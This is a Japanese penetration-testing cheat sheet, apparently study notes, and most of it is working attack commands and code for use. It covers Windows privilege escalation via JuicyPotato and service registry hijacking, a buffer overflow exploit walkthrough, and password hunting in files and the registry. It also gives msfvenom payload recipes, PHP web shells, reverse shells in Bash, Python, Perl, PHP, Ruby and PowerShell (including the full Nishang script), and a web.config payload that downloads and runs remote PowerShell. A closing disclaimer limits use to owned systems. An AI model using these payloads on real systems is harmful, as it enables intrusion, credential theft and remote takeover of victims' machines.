https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#uac

https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/

UACがオンになっているか確認します。

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System	
```

```cmd
Consen	tPromptBehaviorAdmin    REG_DWORD    0x5
EnableLUA    REG_DWORD    0x1
PromptOnSecureDesktop    REG_DWORD    0x1
```

これはUACがオンになっていることを意味します。これは、レジストリを読み取ることで確認できます。

EnableLUA UACが有効かどうかを示します。0の場合、バイパスする必要はまったくなく、PsExecからSYSTEMに接続できます。
ただし、1の場合は、他の2つのキーを確認してください
ConsentPromptBehaviorAdmin理論的には6つの可能な値を取ることができます
Windows設定でUACスライダーを構成すると、0、2、または5のいずれかになります。
PromptOnSecureDesktop 0または1のいずれかのバイナリです。

Metasploit

```
Module: exploit/windows/local/bypassuac_eventvwr
```

#### レジスレリーが変更できるか

サービスレジストリを変更できるかどうかを確認してください。サービスレジストリのパーミッションを確認することができます。

```cmd
reg query hklm\System\CurrentControlSet\Services /s /v imagepath 
```

書き込み権限があるかどうかを確認

```cmd
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Authenticated UsersやNT AUTHORITYINTERACTIVEがFullControlを持っているかどうかを確認します。その場合、サービスで実行されるバイナリを変更することができます。実行するバイナリのパスを変更します。

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

#### JuicyPotato

`whoami /priv`

下記のどちらかが有効でであれば有効な可能性がある

```cmd
SeImpersonatePrivilege enable
SeAssignPrimaryTokenPrivilege enable
```

コマンド実行例

```cmd
Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe -e cmd.exe <IP> <port>" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}

Juicy.Potato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe -e cmd.exe <IP> <port>" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}

Juicy.Potato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```

参考文献とダウンロード先

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

https://github.com/ohpe/juicy-potato/releases
https://github.com/ivanitlearning/Juicy-Potato-x86/releases

#### クロスコンパイル

```bash
#Compile Windows exploit in Linux
i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe

#Compile Python script to executable
wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile exploit.py
```

 #### ファイルとレジストリでの一般的なパスワード検索

```cmd
#ファイル検索
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

#ファイル名を探す
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

#レジストリーを検索
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

#### Windows Suggester

```bash
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2020-10-17-mssb.xls --systeminfo systeminfo.txt
```

Metasploit

```
msf5 exploit(multi/handler) >  use post/multi/recon/local_exploit_suggester
```

#### Windows Remote Exploit

```bash
ms03-026
ms03-039 (1)
ms03-039 (2)
ms03-049
ms04-007
ms04-011 - ssl bof
ms04-011 - lsasarv.dll
ms04-031
ms05-017
1ms05-039
ms06-040 (1)
ms06-040 (2)
ms06-070
ms08-067 (1)
ms08-067 (2)
ms08-067 (3)
ms09-050
```

#### Windows Local Exploits

```
ms04-011
ms04-019 (1)
ms04-019 (2)
ms04-019 (3)
ms04-020
keybd_event
ms05-018
ms05-055
ms06-030
ms06-049
print spool service
ms08-025
netdde
ms10-015
ms10-059
ms10-092
ms11-080
ms14-040
ms14-058 (1)
ms14-058 (2)
ms14-070 (1)
ms14-070 (2)
ms15-010 (1)
ms15-010 (2)
ms15-051
ms16-014
ms16-016
ms16-032
```

#### コンパイル済みペイロード

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

https://github.com/abatchy17/WindowsExploits

https://kakyouim.hatenablog.com/entry/2020/05/27/010807

https://github.com/nomi-sec/PoC-in-GitHub
https://github.com/abatchy17/WindowsExploits
https://github.com/SecWiki/windows-kernel-exploits #
https://github.com/SecWiki/windows-kernel-exploits ##

https://github.com/lucyoa/kernel-exploits/

https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits

# その他

# BufferOverFrow

# バッファオーバーフローの基本

x86アーキテクチャには、データを格納するために使用される8つの汎用レジスタが含まれており、そのポイントをメモリ内の他の位置にアドレス指定できます。

- EBP（ベースポインター）
- ESP（スタックポインター）
- EAX（アキュムレータ）
- EBX（ベース）
- ECX（カウンター）
- EDX（データ）
- EDI（宛先インデックス）
- ESI（ソースインデックス） EIP：拡張命令ポインタ。これは読み取り専用レジスタであり、次に実行される命令のアドレスが含まれています（CPUに次に何をするかを指示します）。 ESP：拡張スタックポインタ。下部のメモリ位置にあるスタックの最上位を（いつでも）指します。 EBP：拡張ベーススタックポインタ。スタックの一番下にある上位のアドレス（最後のアイテム）を指します。

## 一般的な不良文字列

```
0x00     NULL (\0)
0x09     Tab (\t)
0x0a     Line Feed (\n)
0x0d     Carriage Return (\r)
0xff     Form Feed (\f)
```

## 不良文字列リスト

```
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

またはBashで不良文字列リストを作成する

```
for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
```

Pythonの場合は

```
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
```

## Windows

#### Immunity-Debuggerのダウンロード

https://softfamous.com/immunity-debugger/download/

ステップ1：クラッシュするまでファズし、EIPがA（x41）で上書きされることに注意してください。

ステップ2： pattern_create.rbを使用して文字列を生成し、それをターゲットに送信します

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
```

ステップ3： EIPを上書きする4バイトを特定します（これはHEXにあります）

ステップ4： pattern_offset.rbを使用して、これらの特定の4バイトのオフセットを計算します

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
```

ステップ5：新しいバッファ文字列を送信して、EIPレジスタを制御できるかどうかを確認します。これはBで上書きする必要があるためです。ESPおよびEIPレジスタの結果を悪用して通知するために追加します。

```
buffer = "A" * 2606 + "B" * 4 + "C" * 90
```

ステップ6：バッファ内で使用可能なスペースが多いかどうかを確認します（バッファ長を2700バイトから3500バイトに増やして、シェルコードのバッファスペースが大きくなるかどうかを確認します）。

「morespace.py」を起動します-> ESPを右クリックします->ダンプをフォローします。エクスプロイトに追加し、Cをチェックします。

```
buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
```

ステップ7：不正な文字（0x00から0xff）を確認します。これらすべての文字をバッファ内に貼り付け、ESPレジスタダンプが切り捨てられる場所を確認します。ESPを右クリックし、ダンプをたどって確認します。

```
＃スキップされた文字に注意する
```

ステップ8：バッファに直接ジャンプできない場合は、JMPESPなどの命令を含む信頼できるアドレスをメモリ内で見つける必要があります。そこにジャンプすると、ジャンプ時にESPレジスタが指すアドレスに到達する可能性があります。これは、ESPレジスタによって示されるメモリに到達するための信頼できる間接的な方法です。mona.pyは、リターンアドレスを検索できるメモリ内のモジュールを特定するのに役立ちます（DEPおよびASLRが存在しない必要があり、不正な文字を含まない高メモリ範囲）

```
!mona modules
```

メモリ保護スキーム（Rebase、SafeSEH、ASLR、NXCompat）の影響を受けていないかどうかを確認し、特定のDLL（右の列）をメモします。

ステップ9： JMPESP相当=オペコード。

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
```

結果を次のようにメモします： "\ xff \ xe4"

シェルコードを入れるスタック領域がない場合

スタック領域の先頭にpayloadをセットし、 スタック領域の先頭にジャンプする命令をESP(ときど場合による)にセットする

必ずしも ESP にジャンプするとは限らない

```
kali@kali:~$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ecx
00000000  FFE1              jmp ecx

first_stage = "\xff\xe1"
#filler = "A" * 2080 + "BBBB" + first_stage + "C" * 400
filler = shellcode + "A" * (2080 - int(len(shellcode))) + “EIP” + first_stage + "C" * 30
```

ステップ10： monaを使用して、手順8で見つかったDLL内のJMP ESPメモリアドレスを見つけます。不正な文字を含まないアドレスを使用します。

```
!mona find -s "\xff\xe4" -m <dllname>.dll
```

ステップ11： Immunity Debuggerを一時停止し、アドレスに従います（右向きの黒い矢印：「従うべき表現」）。JMP ESPが見つかったかどうかに注意してください（左上のペイン）。

ステップ12：ブレークポイントを設定して、JMPESPに到達できるかどうかを確認します。 左上のペイン->右クリック->式 に移動左上のペイン->右クリック->ブレークポイント->トグル（F2） 再生し、次の手順を実行します。 PoCに追加します（メモリアドレスは、ステップ10で見つけたもので、リトルエンディアンと記載されています）。

PoCに追加します（メモリアドレスは、ステップ10で見つけたもので、リトルエンディアンと記載されています）。

```
buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
```

PoCを実行し、ブレークポイントがヒットしたかどうかを確認します（Immunity Debuggerの下部にあるメッセージ）。

ステップ13：リバースシェルを生成する

```
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

ステップ14：リバースシェルコードをエクスプロイトに追加し、次のように変更します。

```
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```

＃必要に応じてNOPスライドを増やす

Access violation when writing to [00000001] が表示されてクラッシュした場合NOPスライドを行う

```
0x90
```

## File転送

## Winosws

#### FTP

```bash
Paste the following code to get nc in the victim:
echo open <attacker_ip> 21> ftp.txt
echo USER offsec>> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
nc.exe <attacker_ip> 1234 -e cmd.exe
```

#### PowerShell

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"

powershell iex(new-object net.webclient).downloadstring('http://<local_ip>/filename.ps1')
```

#### wget.vbs

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

実行

```bash
cscript wget.vbs http://<attacker_ip>/nc.exe nc.exe
```

#### FileUpload

```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://[IP]/upload.php', '[FILE_NAME]')
```

簡易的なupload.php

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

## Linux

```bash
wget [url]
curl -O [url]
```

#### FileUpload

```
curl -X POST -F fname=@$FILEPATH  http://[IP]/up.php
```

#### 簡易的なup.php

```php
<form action="up.php" method="post" enctype="multipart/form-data">
  <input type="file" name="fname">
  <input type="submit" value="アップロード">
</form>

<?php
$tempfile = $_FILES['fname']['tmp_name'];
$filename = '/var/www/uploads/' . $_FILES['fname']['name'];

if (is_uploaded_file($tempfile)) {
    if ( move_uploaded_file($tempfile , $filename )) {
        echo $filename . "をアップロードしました。";
    } else {
        echo "ファイルをアップロードできません。";
    }
} else {
    echo "ファイルが選択されていません。";
} 
?>
```



## MsfVenom

### List payloads

```
msfvenom -l
```

## Metasploit Handler

```
use exploit/multi/handler
set PAYLOAD <Payload name>
Set RHOST <Remote IP>
set LHOST <Local IP>
set LPORT <Local Port>
Run
```

## Binaries Payloads

#### Linux Meterpreter Reverse Shell

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf
```

#### Linux Bind Meterpreter Shell

```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > bind.elf
```

#### Linux Bind Shell

```
msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf > term.elf
```

#### Windows Meterpreter Reverse TCP Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```

#### Windows Reverse TCP Shell

```
msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe
```

#### Windows Encoded Meterpreter Windows Reverse Shell

```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

#### Mac Reverse Shell

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho
```

#### Mac Bind Shell

```
msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f macho > bind.macho
```

## Web Payloads

#### PHP Meterpreter Reverse TCP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php
cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php
```

#### ASP Meterpreter Reverse TCP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp > shell.asp
```

#### JSP Java Meterpreter Reverse TCP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
```

#### WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
```

## Scripting Payloads

#### Python Reverse Shell

```
msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
```

#### Bash Unix Reverse Shell

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```

#### Perl Unix Reverse shell

```
msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
```

## Shellcode

#### Windows Meterpreter Reverse TCP Shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```

#### Linux Meterpreter Reverse TCP Shellcode

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```

#### Mac Reverse TCP Shellcode

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>
```

#### Create User

```
msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
```

## PHP

```php
<?php exec($_GET('cmd'));?>
<?php system($_GET('cmd'));?>
<?php shell_exec($_GET('cmd'));?>
```

## PayloadCollection

#### SQLInjection

https://www.exploit-db.com/papers/12975

 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

MongoDB 

https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code

 https://security.stackexchange.com/questions/129121/help-injecting-a-mongodb-used-by-a-python-web-app 

https://security.stackexchange.com/questions/231154/shellcode-in-mongodb-python-code

#### PowerShell

https://github.com/samratashok/nishang

## ReversShell

### Bash

```bash
bash -i >& /dev/tcp/<ip>/8080 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 1234 >/tmp/f
```

### Perl

```perl
perl -e 'use Socket;$i="<IP>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python1

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Pyrhon2

```python
import os
import pty
import socket

lhost = '<IP>'
lport = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv('HISTFILE','/dev/null')
pty.spawn('/bin/bash')
s.close()
```

### PHP

```php
php -r '$sock=fsockopen("<IP>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<IP>",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```bash
nc -e /bin/sh <ip> 1234
nc <ip> <port>
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### PowerShell

```powershell
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

c:\windows\system32\cmd.exe /c powershell.exe iex(new-object net.webclient).downloadstring('http://<IP>/shell.ps1')
```

### Shell.ps1

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}


Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port 443
```

### Web.config

```asp
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
Set objShell = CreateObject("WScript.Shell")
objShell.Exec("c:\windows\system32\cmd.exe /c powershell.exe iex(new-object net.webclient).downloadstring('http://<IP>/shell.ps1')")
Response.write("<!-"&"-")
%>
-->
```



# 参考サイト

https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

http://www.fuzzysecurity.com/tutorials/expDev/2.html

 https://oscp.securable.nl/buffer-overflow 

https://qiita.com/v_avenger/items/0af8602e4572889f9184

https://book.hacktricks.xyz/

https://guif.re/

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

https://www.exploit-db.com/papers/12975

 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code

 https://security.stackexchange.com/questions/129121/help-injecting-a-mongodb-used-by-a-python-web-app 

https://security.stackexchange.com/questions/231154/shellcode-in-mongodb-python-code

https://github.com/samratashok/nishang

https://github.com/rapid7/ssh-badkeys/tree/master/authorized

https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/

https://gtfobins.github.io/

https://github.com/lucyoa/kernel-exploits/

https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits

https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/

https://github.com/ohpe/juicy-potato/releases
https://github.com/ivanitlearning/Juicy-Potato-x86/releases

https://github.com/abatchy17/WindowsExploits

https://kakyouim.hatenablog.com/entry/2020/05/27/010807

https://github.com/nomi-sec/PoC-in-GitHub
https://github.com/abatchy17/WindowsExploits
https://github.com/SecWiki/windows-kernel-exploits

https://github.com/lucyoa/kernel-exploits/

https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits

# 免責事項
本記事は情報セキュリティにおける攻撃の理解、防衛のスキル向上を目的としたセキュリティに関する内容がございます。本記事の内容を使用し発生した如何なる損害や損失について、当記事作成者は一切の責任を負いません。
本記事の内容を実際に使用して、第三者の個人や組織などを攻撃した場合は 法律により罰せられる可能性がありので、必ず自身が所有している環境のみを 対象とし、他人や組織が所有している環境は決して対象としないようお願いします。
